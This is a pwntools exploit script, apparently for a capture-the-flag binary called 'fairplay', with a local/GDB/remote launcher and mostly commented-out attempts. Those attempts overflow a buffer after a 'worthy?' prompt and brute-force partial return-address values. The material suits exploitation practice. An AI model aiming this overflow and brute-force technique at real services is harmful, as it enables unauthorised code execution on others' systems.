from pwn import *
from warnings import filterwarnings

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
piebase
breakrva 0x121d
continue
'''.format(**locals())

exe = './fairplay'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'info'
filterwarnings("ignore")

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

io = start()
# io.sendafter(b'worthy?', b'B'*18+b'AA')



# r = ['0x911a', '0x911c', '0x9142', '0x9145', '0x9146', '0x914a', '0x914f', '0x9150', '0x9151', '0x9152', '0x9154', '0x9158', '0x915d', '0x915e', '0x915f', '0x9160', '0x9161', '0x9162', '0x9163', '0x9164', '0x9165', '0x9167', '0x916b', '0x9170', '0x9183']

# for i in r:
#     try:
#         io = start()
#         val = int(i, 16)
#         print(f"Using {hex(val)}")
#         io.sendafter(b'worthy?', b'B'*18+p64(val))
#         io.interactive()
#     except Exception:
#         pass



# [0x9382, 0x93a6, 0x962c, 0x9724, 0x980c]

# __libc_start_call_main+54
# 0x7ffff7de918c

# nibble = []
# for i in range(0x91aa, 37306+1):
#     try:
#         io = start()
#         print(f"Using {hex(i)}")
#         io.sendafter(b'worthy?', b'B'*18+p64(i))
#         # print(io.recvall())
#         if b'\nAre you' in io.recvall():
#             nibble.append(hex(i))
#             print(nibble)
#         else:
#             io.close()
#     except Exception:
#         pass